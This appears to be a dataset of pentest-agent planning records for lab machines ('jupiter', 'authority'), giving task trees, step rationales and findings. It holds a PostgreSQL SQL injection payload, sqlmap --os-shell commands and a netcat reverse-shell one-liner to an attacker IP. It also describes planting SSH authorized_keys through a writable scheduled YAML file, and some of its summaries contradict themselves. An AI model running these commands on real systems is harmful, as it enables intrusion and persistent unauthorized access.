   1.7 Enumeration of Users and Files - {Findings: User Accounts Identified: Additional Users: juno, jovian; Commands Executed by User `juno`: rm -rf /dev/shm/shadow.data; /bin/bash /home/juno/shadow-simulation.sh; /bin/sh -c /home/juno/shadow-simulation.sh; sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE; lscpu --online --parse=CPU,CORE,SOCKET,NODE; /usr/bin/python3 -m http.server 80; Multiple instances of /usr/bin/curl -s server; cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/; Observations: User `juno` appears to be active, executing scripts every two minutes; Security Misconfiguration: The `network-simulation.yml` file has a misconfiguration that allows write access to any user.}
   1.8 Explore the content of the network-simulation.yml file - {Findings: General Configuration: Simulation Duration: Stops after 10 simulated seconds (`stop_time: 10s`); System Call Latency: Enabled to prevent busy looping during non-blocking system calls (`model_unblocked_syscall_latency: true`); Network Configuration: Network Graph Type: Utilizes a built-in network graph with a single vertex and a bandwidth of 1 Gbit (`type: 1_gbit_switch`); Host Configuration: Server Host: Hostname: `server`, Network Node ID: 0, Processes: Path: `/usr/bin/python3`, Arguments: `-m http.server 80`, Start Time: 3 seconds; Client Hosts: Hostnames: `client1`, `client2`, `client3`, Network Node ID: 0, Quantity: 3, Processes: Path: `/usr/bin/curl`, Arguments: `-s server`, Start Time: 5 seconds; Observations: The configuration file is executed automatically by user `juno` on the system; Implications: Since the configuration file can be modified, there is an opportunity to alter one of the commands to potentially gain unauthorized access to user `juno`'s account.}
   1.9 Edit the network-simulation.yml file to generate an SSH key pair - {Findings: Action Taken: An SSH key pair was generated, and the private key was placed in the `/home/juno/.ssh` directory; Configuration Details: Start Time for SSH Key Placement: 3 seconds; Client Hosts Configuration: Hostnames: `client1`, `client2`, `client3`; Network Node ID: 0; Quantity: 3 hosts; Processes: Path: `/usr/bin/cp`, Arguments: `""/dev/shm/authorized_keys /home/juno/.ssh""`; Start Time: 5 seconds; Observations: The private key was placed in the `.ssh` directory of user `juno`, which is critical for SSH authentication; Implications: If the private key is accessible and not properly secured, it could lead to unauthorized access to user `juno`'s account; The copying of the `authorized_keys` file indicates a potential backdoor or an attempt to facilitate easy access to the system.}
   1.10 Target IP - 10.10.11.216",Try to obtain a ssh connection,"1. The selected step of editing the `network-simulation.yml` file to generate a private key in the `/home/juno/.ssh` directory is a logical progression from the previous findings. The exploration of the file revealed that it is executed automatically by the user `juno` and has write permissions, allowing us to modify its contents. This capability provides a unique opportunity to leverage the file for our benefit.

2. The rationale behind this step includes:
   - **Establishing SSH Access:** By modifying the `network-simulation.yml` file to include a command that generates a public/private SSH key pair, we can place the private key in the `/home/juno/.ssh` directory. This is crucial because if `juno` attempts to connect via SSH, we can use the corresponding public key to authenticate and gain access to the system.
   - **Exploiting the Misconfiguration:** The write permissions on the `network-simulation.yml` file represent a security misconfiguration that we can exploit. By injecting our command into this file, we can effectively execute it under the context of `juno`, allowing us to manipulate the environment to our advantage.
   - **Potential for Privilege Escalation:** Gaining SSH access as `juno` could lead to further escalation opportunities, especially since `juno` appears to be an active user executing scripts and commands regularly. This access could allow us to explore the system more thoroughly and identify additional vulnerabilities or sensitive information.

3. Given the successful identification of the `network-simulation.yml` file's vulnerabilities and its potential for exploitation, it is logical to proceed with the strategy of editing the file to generate an SSH key pair. This step is critical for establishing a foothold in the system, as SSH access can provide a stable and persistent means of interacting with the target environment. By executing this strategy, we can maximize our chances of successfully gaining unauthorized access and furthering our penetration testing objectives. Thus, this approach is both justified and essential for the next phase of our engagement.","**SSH Key Pair Generation Summary:**

- **Action Taken:**
  - An SSH key pair was generated, and the private key was placed in the `/home/juno/.ssh` directory.

- **Configuration Details:**
  - **Start Time for SSH Key Placement:** 3 seconds.
  - **Client Hosts Configuration:**
    - **Hostnames:** `client1`, `client2`, `client3`.
    - **Network Node ID:** 0.
    - **Quantity:** 3 hosts.
    - **Processes:**
      - **Path:** `/usr/bin/cp`
      - **Arguments:** `""/dev/shm/authorized_keys /home/juno/.ssh""`
      - **Start Time:** 5 seconds.

**Observations:**
- The private key was placed in the `.ssh` directory of user `juno`, which is critical for SSH authentication.
- The process involves copying the `authorized_keys` file from `/dev/shm` to the `.ssh` directory, suggesting that the public key may have been added to allow SSH access.

**Implications:**
- If the private key is accessible and not properly secured, it could lead to unauthorized access to user `juno`'s account.
- The copying of the `authorized_keys` file indicates a potential backdoor or an attempt to facilitate easy access to the system.

**Recommendations for Further Action:**
- Verify the permissions on the `/home/juno/.ssh` directory and the `authorized_keys` file to ensure they are secure.
- Investigate the origin of the SSH key pair and whether it was generated by a legitimate process.
- Monitor user `juno` for any unusual activity or attempts to access the system using SSH.
- Consider implementing logging for SSH access attempts to detect unauthorized access.",Login to the machine using ssh,"1. The intended task of the previous step, which involved editing the `network-simulation.yml` file to generate an SSH key pair and place the private key in the `/home/juno/.ssh` directory, was successfully achieved. The findings confirmed that the private key was indeed placed in the correct location and that the `authorized_keys` file was copied, suggesting that the public key was set up for authentication.

2. The key findings from the previous step include:
   - The SSH key pair was generated successfully, and the private key is now located in the `/home/juno/.ssh` directory.
   - The presence of the `authorized_keys` file indicates that the public key has been added to allow SSH access for the user `juno`.
   - This setup is critical for establishing a secure SSH connection, as it allows for key-based authentication without needing a password.

3. Given that the previous step was successful, it is logical to proceed with the strategy of logging into the machine using SSH. Since the public key has been configured for the user `juno`, we can use the corresponding private key to authenticate and gain access to the system. This step is crucial for further penetration testing efforts, as gaining SSH access will enable us to explore the system more thoroughly, potentially leading to privilege escalation or the discovery of additional vulnerabilities.

In conclusion, the successful placement of the SSH key pair sets the stage for the next step: logging into the machine via SSH. This strategy is justified and essential for maximizing our access and continuing our assessment of the target environment. Thus, we should move forward with this strategy without hesitation.",Exploit the selected exploitations,"1. The selected step of logging into the machine using SSH is a logical continuation of the previous actions taken. Given the successful execution of the previous step, which involved generating an SSH key pair and placing the private key in the `/home/juno/.ssh` directory, we are now positioned to authenticate and gain access to the system as the user `juno`.

2. The rationale behind this step includes:
   - **Key-Based Authentication:** The SSH key pair allows for secure key-based authentication. The public key has been placed in the `authorized_keys` file, which means that when we attempt to connect via SSH, the server will recognize the corresponding private key and grant access without requiring a password.
   - **Access to User Environment:** Logging in as `juno` will provide us with access to the user's environment, including any running processes, files, and configurations that may be of interest for further exploitation or enumeration. Since `juno` has been observed executing scripts and commands, this access could lead to valuable findings regarding the system's configuration or vulnerabilities.
   - **Potential for Further Exploitation:** Gaining SSH access as `juno` not only allows us to explore the system further but also could present opportunities for privilege escalation if `juno` has elevated privileges or access to sensitive areas of the system.

3. Given that the previous steps have successfully set the groundwork for SSH access, it is logical to proceed with the strategy of logging into the machine using SSH. This step is critical for establishing a foothold in the system and allows us to leverage the access gained for further penetration testing activities. Therefore, this strategy is justified and essential for advancing our objectives within the target environment. By executing this step, we can maximize our chances of uncovering additional vulnerabilities or sensitive information that may aid in our overall assessment.","{'Interactive CLI': ""Log into the machine using SSH as user 'juno' with the private key.""}"
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {""queries"":[{""refId"":""A"",""datasource"":{""type"":""postgres"",""uid"":""Yt5Lg-Vz""},""rawSql"":""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",""format"":""table"",""datasourceId"":1,""intervalMs"":60000,""maxDataPoints"":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}
   1.5 SQL Injection Exploitation - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables; Current User: grafana_viewer; Current Database (Schema): public; Current User is DBA: True; Available Databases: public; Number of Tables in 'public': 1 table; Table Name: moons; current_setting('is_superuser')}
   1.6 SQL Injection Reverse Shell - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --os-shell --time-sec=1; Current User Privileges: Confirmed that the current user is a Database Administrator (DBA); Shell Output: Whoami Command Result: 'postgres'; Reverse Shell Payload: Executed command to establish a reverse shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 10001 >/tmp/f &}
   1.7 Enumeration of Users and Files - {Findings: User Accounts Identified: Additional Users: juno, jovian; Commands Executed by User `juno`: rm -rf /dev/shm/shadow.data; /bin/bash /home/juno/shadow-simulation.sh; /bin/sh -c /home/juno/shadow-simulation.sh; sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE; lscpu --online --parse=CPU,CORE,SOCKET,NODE; /usr/bin/python3 -m http.server 80; Multiple instances of /usr/bin/curl -s server; cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/; Observations: User `juno` appears to be active, executing scripts every two minutes; Security Misconfiguration: The `network-simulation.yml` file has a misconfiguration that allows write access to any user.}
   1.8 Explore the content of the network-simulation.yml file - {Findings: General Configuration: Simulation Duration: Stops after 10 simulated seconds (`stop_time: 10s`); System Call Latency: Enabled to prevent busy looping during non-blocking system calls (`model_unblocked_syscall_latency: true`); Network Configuration: Network Graph Type: Utilizes a built-in network graph with a single vertex and a bandwidth of 1 Gbit (`type: 1_gbit_switch`); Host Configuration: Server Host: Hostname: `server`, Network Node ID: 0, Processes: Path: `/usr/bin/python3`, Arguments: `-m http.server 80`, Start Time: 3 seconds; Client Hosts: Hostnames: `client1`, `client2`, `client3`, Network Node ID: 0, Quantity: 3, Processes: Path: `/usr/bin/curl`, Arguments: `-s server`, Start Time: 5 seconds; Observations: The configuration file is executed automatically by user `juno` on the system; Implications: Since the configuration file can be modified, there is an opportunity to alter one of the commands to potentially gain unauthorized access to user `juno`'s account.}
   1.9 Edit the network-simulation.yml file to generate an SSH key pair - {Findings: Action Taken: An SSH key pair was generated, and the private key was placed in the `/home/juno/.ssh` directory; Configuration Details: Start Time for SSH Key Placement: 3 seconds; Client Hosts Configuration: Hostnames: `client1`, `client2`, `client3`; Network Node ID: 0; Quantity: 3 hosts; Processes: Path: `/usr/bin/cp`, Arguments: `""/dev/shm/authorized_keys /home/juno/.ssh""`; Start Time: 5 seconds; Observations: The private key was placed in the `.ssh` directory of user `juno`, which is critical for SSH authentication; Implications: If the private key is accessible and not properly secured, it could lead to unauthorized access to user `juno`'s account; The copying of the `authorized_keys` file indicates a potential backdoor or an attempt to facilitate easy access to the system.}
   1.10 SSH Access - {Findings: Event: Successful SSH login; User Account: Access obtained as the `juno` user; Key Points of Interest: The successful login indicates that the SSH key pair placed in `/home/juno/.ssh` was correctly configured for authentication; The ability to obtain a shell as the `juno` user suggests that the security of the SSH setup may be compromised, especially if the key was not intended for legitimate access; Implications: Gaining shell access as the `juno` user could allow for further exploration of the system, potential privilege escalation, and access to sensitive data; This successful access poses a significant security risk, particularly if the `juno` account has elevated privileges or access to critical resources; Recommendations for Further Action: Conduct a thorough review of the `juno` user's permissions and access rights to assess potential risks; Investigate how the SSH key was generated and placed in the `.ssh` directory to determine if it was part of a legitimate process or an unauthorized action; Monitor the `juno` user's activities for any signs of malicious behavior or further exploitation; Consider implementing additional security measures, such as disabling password authentication, enforcing key-based authentication only, and setting up alerts for unusual SSH access patterns.}
   1.11 Target IP - 10.10.11.216",Login to the machine using ssh,"1. The selected step of logging into the machine using SSH is a logical continuation of the previous actions taken. Given the successful execution of the previous step, which involved generating an SSH key pair and placing the private key in the `/home/juno/.ssh` directory, we are now positioned to authenticate and gain access to the system as the user `juno`.

2. The rationale behind this step includes:
   - **Key-Based Authentication:** The SSH key pair allows for secure key-based authentication. The public key has been placed in the `authorized_keys` file, which means that when we attempt to connect via SSH, the server will recognize the corresponding private key and grant access without requiring a password.
   - **Access to User Environment:** Logging in as `juno` will provide us with access to the user's environment, including any running processes, files, and configurations that may be of interest for further exploitation or enumeration. Since `juno` has been observed executing scripts and commands, this access could lead to valuable findings regarding the system's configuration or vulnerabilities.
   - **Potential for Further Exploitation:** Gaining SSH access as `juno` not only allows us to explore the system further but also could present opportunities for privilege escalation if `juno` has elevated privileges or access to sensitive areas of the system.

3. Given that the previous steps have successfully set the groundwork for SSH access, it is logical to proceed with the strategy of logging into the machine using SSH. This step is critical for establishing a foothold in the system and allows us to leverage the access gained for further penetration testing activities. Therefore, this strategy is justified and essential for advancing our objectives within the target environment. By executing this step, we can maximize our chances of uncovering additional vulnerabilities or sensitive information that may aid in our overall assessment.","**SSH Access Summary:**

- **Event:** Successful SSH login.
- **User Account:** Access obtained as the `juno` user.

**Key Points of Interest:**
- The successful login indicates that the SSH key pair placed in `/home/juno/.ssh` was correctly configured for authentication.
- The ability to obtain a shell as the `juno` user suggests that the security of the SSH setup may be compromised, especially if the key was not intended for legitimate access.

**Implications:**
- Gaining shell access as the `juno` user could allow for further exploration of the system, potential privilege escalation, and access to sensitive data.
- This successful access poses a significant security risk, particularly if the `juno` account has elevated privileges or access to critical resources.

**Recommendations for Further Action:**
- Conduct a thorough review of the `juno` user's permissions and access rights to assess potential risks.
- Investigate how the SSH key was generated and placed in the `.ssh` directory to determine if it was part of a legitimate process or an unauthorized action.
- Monitor the `juno` user's activities for any signs of malicious behavior or further exploitation.
- Consider implementing additional security measures, such as disabling password authentication, enforcing key-based authentication only, and setting up alerts for unusual SSH access patterns.",Enumerate the machine to find more information,"1. The intended task of the previous step, which involved successfully logging into the machine via SSH as the user `juno`, was achieved. This successful login indicates that we have established a foothold in the system, allowing us to explore the machine further.

2. The key findings from this successful access include:
   - We now have the ability to execute commands as the `juno` user, which opens up opportunities to explore the user’s environment, including files, processes, and configurations.
   - The `juno` user has been observed executing various scripts and commands, indicating that there may be valuable information or misconfigurations that could be leveraged for privilege escalation.
   - There is potential access to sensitive data or critical resources, as the `juno` user may have elevated privileges or access to restricted areas of the system.

3. Given the successful access obtained in the previous step, it is logical to proceed with the strategy of enumerating the machine to find more information. This step is crucial for gathering intelligence that could lead to privilege escalation or the discovery of additional vulnerabilities. By exploring the files, commands, and privileges associated with the `juno` user, we can maximize our chances of uncovering valuable insights that could aid in our overall penetration testing objectives.

In conclusion, the successful SSH access provides a solid foundation for further enumeration of the machine. This strategy is justified and essential for advancing our assessment of the target environment, and we should move forward with it without hesitation.","Explore the suspicious files, commands and create a summary of the findings.","1. The selected step of exploring suspicious files, commands, and their privileges is a logical progression from the previous actions taken after gaining access to the machine as the `juno` user. This step aims to identify any potential vulnerabilities or misconfigurations that could be exploited for privilege escalation.

2. The rationale behind this step includes:
   - **Identifying Suspicious Files:** The enumeration phase should focus on files that exhibit unusual permissions or configurations. Given that the `network-simulation.yml` file previously identified has misconfigurations allowing write access to any user, it is crucial to explore it further to understand its contents and potential for exploitation.
   - **Reviewing Executed Commands:** The commands executed by the `juno` user provide insight into the user's activities and the overall system configuration. Analyzing these commands can reveal patterns or scripts that may contain vulnerabilities or sensitive information.
   - **Privilege Assessment:** By examining the privileges associated with the `juno` user and any files or processes they can access, we can assess the potential for privilege escalation. If `juno` has access to files or commands that should be restricted, this could lead to further exploitation opportunities.

3. Given the successful access obtained in the previous step, it is logical to proceed with the strategy of exploring suspicious files and commands. This step is critical for gathering intelligence that could lead to privilege escalation or the discovery of additional vulnerabilities. By summarizing the findings from this exploration, we can create a clear picture of the system's security posture and identify actionable steps for further exploitation or remediation.

In conclusion, exploring the files, commands, and their privileges is a justified and essential step in our enumeration strategy. It allows us to leverage the access gained as the `juno` user to uncover valuable insights that may facilitate privilege escalation or highlight security weaknesses in the target environment. Therefore, we should move forward with this step confidently.","{'Interactive CLI': 'Explore suspicious files and commands, assess privileges, and summarize findings.'}"
authority,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)",,,"- Host IP: 10.129.229.56
- Open Ports and Services:
  - Port 53/tcp: domain (Simple DNS Plus)
  - Port 80/tcp: http (Microsoft IIS httpd 10.0)
  - Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos)
  - Port 135/tcp: msrpc (Microsoft Windows RPC)
  - Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn)
  - Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP)
  - Port 445/tcp: microsoft-ds?
  - Port 464/tcp: kpasswd5?
  - Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0)
  - Port 8443/tcp: ssl/https-alt
- Notable Information:
  - Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
  - The SSL certificates are valid from 2022-08-09 to 2024-08-09
  - The web server on port 80 has potentially risky HTTP methods available: TRACE
  - The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02
  - The host is identified as ""AUTHORITY"" running Microsoft Windows
  - Message signing enabled and required for smb2-security-mode
  - The detected time skew is 4 hours, 43 seconds.- Date of scan: 2025-09-02T09:48:47
- The scan was performed on 1 IP address, with 1 host found to be up.
- Total scan duration: 269.09 seconds.","Enumerate the port 80, the HTTP service","1. The previous step was successful in identifying the open ports and services running on them. The key findings include the identification of a variety of services such as domain, http, kerberos-sec, msrpc, netbios-ssn, ldap/ssl/ldap, microsoft-ds, kpasswd5, ncacn_http, and ssl/https-alt running on respective open ports.

2. The HTTP service running on port 80 was identified as Microsoft IIS httpd 10.0. This is a key finding as HTTP services often host web applications which can have vulnerabilities that allow for further exploitation. Additionally, it was noted that potentially risky HTTP methods are available, specifically TRACE. This could potentially lead to vulnerabilities like Cross-Site Tracing (XST) attacks.

3. Given the findings from the previous step, it is reasonable to continue with the current strategy of service enumeration. Specifically, enumerating the HTTP service on port 80 could reveal further information about the web server, any hosted web applications, and potential vulnerabilities. This could provide a potential entry point for further penetration testing steps.","Enumerate further on the X service to find software versions, hidden directories and file.","1. The updated PTT reveals that the HTTP service running on port 80 has potentially risky HTTP methods available, specifically TRACE. This information was obtained from the previous step of identifying open ports and services running on them. 

2. Based on this finding, it is logical to further enumerate the HTTP service to gain more insight. The HTTP service, especially running on port 80, is often associated with web applications that could potentially have exploitable vulnerabilities. 

3. The selected step of further enumeration on the HTTP service aims to uncover more details about the service. This could include the software versions, hidden directories, and files. Information like software versions can help identify known vulnerabilities associated with those specific versions. Hidden directories and files can sometimes contain sensitive information or access points that are not intended to be public.

4. Tools like browsers, curl, and gobuster can be used for this enumeration. A browser can provide a visual interface to interact with the web application, curl can be used to send various types of HTTP requests and analyze the responses, and gobuster is a tool specifically designed for directory and file brute-forcing on web servers. 

5. Therefore, given the potential vulnerabilities associated with HTTP services and the tools available for HTTP service enumeration, it is a logical next step to enumerate further on the HTTP service running on port 80.","{'Web page interaction': 'Interact with the HTTP service to gather information.', 'Interactive CLI': 'Use curl to send HTTP requests and analyze responses.', 'Dirbuster': 'Brute-force hidden directories and files on the web server.'}"
authority,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (to-do)","Enumerate the port 80, the HTTP service","1. The updated PTT reveals that the HTTP service running on port 80 has potentially risky HTTP methods available, specifically TRACE. This information was obtained from the previous step of identifying open ports and services running on them. 

2. Based on this finding, it is logical to further enumerate the HTTP service to gain more insight. The HTTP service, especially running on port 80, is often associated with web applications that could potentially have exploitable vulnerabilities. 

3. The selected step of further enumeration on the HTTP service aims to uncover more details about the service. This could include the software versions, hidden directories, and files. Information like software versions can help identify known vulnerabilities associated with those specific versions. Hidden directories and files can sometimes contain sensitive information or access points that are not intended to be public.

4. Tools like browsers, curl, and gobuster can be used for this enumeration. A browser can provide a visual interface to interact with the web application, curl can be used to send various types of HTTP requests and analyze the responses, and gobuster is a tool specifically designed for directory and file brute-forcing on web servers. 

5. Therefore, given the potential vulnerabilities associated with HTTP services and the tools available for HTTP service enumeration, it is a logical next step to enumerate further on the HTTP service running on port 80.","- The webpage is running Windows Internet Information Services.
- SMB enumeration revealed both standard and non-standard shares.
- Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL.
- Non-standard shares found are ""Department Shares"" and ""Development"".
- The target IP for SMB enumeration is 10.10.11.222.
- SMB1 is disabled, no workgroup available.",Check the developmment share,"1. The intended task of the previous step was to enumerate SMB shares, which was successfully achieved. The key findings include the identification of both standard and non-standard SMB shares. Standard shares include ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"".

2. The identification of the non-standard ""Development"" share is a significant finding. Non-standard shares often contain sensitive information or can provide additional access points that are not intended to be public. This could potentially lead to further exploitation opportunities.

3. Given the findings from the previous step, it is reasonable to continue with the current strategy of SMB enumeration. Specifically, further enumeration of the ""Development"" share could reveal more information about its contents and potential vulnerabilities. This could provide a potential entry point for further penetration testing steps.

4. Therefore, the selected strategy is to check the ""Development"" share further. This will involve accessing the share and exploring its contents, which could potentially reveal sensitive information or additional vulnerabilities.",Enumerate the domain,"1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified, which is a significant finding.

2. SMB shares, especially non-standard ones, can contain sensitive information or provide additional access points that are not intended to be public. This makes the ""Development"" share a potential target for further exploration and exploitation.

3. The selected step is to enumerate the ""Development"" share within the SMB service. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

4. Enumerating the ""Development"" share could reveal useful information such as its contents, permissions, and potential vulnerabilities. This information could provide further insight into the target system and potentially provide a path for further exploitation.

5. Therefore, given the potential value of non-standard SMB shares and the findings from the previous steps, it is a logical next step to enumerate the ""Development"" share within the SMB service.","{'Smb client': ""Enumerate the 'Development' share within the SMB service to reveal its contents, permissions, and potential vulnerabilities.""}"
authority,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)",Check the developmment share,"1. The updated PTT reveals that the SMB service has been successfully enumerated, revealing both standard and non-standard shares. Among these, the non-standard ""Development"" share has been identified, which is a significant finding.

2. SMB shares, especially non-standard ones, can contain sensitive information or provide additional access points that are not intended to be public. This makes the ""Development"" share a potential target for further exploration and exploitation.

3. The selected step is to enumerate the ""Development"" share within the SMB service. This step is logical because it follows the strategy of further investigating potential vulnerabilities or access points identified in the previous steps. 

